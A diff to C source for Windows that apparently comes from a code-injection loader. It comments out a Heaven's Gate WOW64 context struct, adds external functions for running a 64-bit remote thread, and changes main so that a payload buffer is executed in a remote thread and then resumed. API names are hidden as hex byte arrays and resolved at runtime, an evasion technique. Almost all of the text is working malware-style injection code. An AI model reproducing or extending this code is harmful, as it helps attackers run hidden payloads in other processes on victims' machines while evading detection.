@@ -27,32 +27,32 @@ typedef struct _ldr_data_table_entry
     MY_UNICODE_STRING BaseDllName;
 } MY_LDR_DATA_TABLE_ENTRY;
 
-typedef struct _WOW64CONTEXT
-{
-    union
-    {
-        HANDLE hProcess;
-        BYTE bPadding2[8];
-    } h;
+// typedef struct _WOW64CONTEXT
+// {
+//     union
+//     {
+//         HANDLE hProcess;
+//         BYTE bPadding2[8];
+//     } h;
 
-    union
-    {
-        LPVOID lpvStartAddress;
-        BYTE bPadding1[8];
-    } s;
+//     union
+//     {
+//         LPVOID lpvStartAddress;
+//         BYTE bPadding1[8];
+//     } s;
 
-    union
-    {
-        LPVOID lpParameter;
-        BYTE bPadding2[8];
-    } p;
+//     union
+//     {
+//         LPVOID lpParameter;
+//         BYTE bPadding2[8];
+//     } p;
 
-    union
-    {
-        HANDLE hThread;
-        BYTE hPadding2[8];
-    } t;
-} WOW64CONTEXT, *LPWOW64CONTEXT;
+//     union
+//     {
+//         HANDLE hThread;
+//         BYTE hPadding2[8];
+//     } t;
+// } WOW64CONTEXT, *LPWOW64CONTEXT;
 
 // // Function to go to jump to 64 bit mode from 32 bit mode through "Heaven's Gate",
 // // before attempting to create a thread in the target process
@@ -60,6 +60,9 @@ typedef struct _WOW64CONTEXT
 
 // // Function to create a new thread in the target process and provide the threadID
 // typedef DWORD(WINAPI *EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter);
+
+extern ExecuteRemoteThread64(LPVOID PayloadMem, PHANDLE hThread);
+extern ExecuteCreateProcess64(void);
 
 size_t MyStrLen(CHAR *str)
 {
@@ -311,7 +314,17 @@ int main(void)
         goto shutdown;
     }
 
-    ((void)sniff_data);
+    HANDLE hThread = NULL;
+    DWORD iRetVal = ExecuteRemoteThread64(lpvPayloadMem, &hThread);
+
+    if (hThread != NULL)
+    {
+        char cResumeThread[] = {0x52, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0};
+        DWORD(WINAPI * pResumeThread)
+        (HANDLE hHandle) = pGetProcAddress(hKernel, cResumeThread);
+
+        pResumeThread(hThread);
+    }
 
     char cOutputDebugStringA[] = {0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x65, 0x62, 0x75, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x41, 0};
     void(WINAPI * pOutputDebugStringA)(LPCSTR lpOutputString) = pGetProcAddress(hKernel, cOutputDebugStringA);
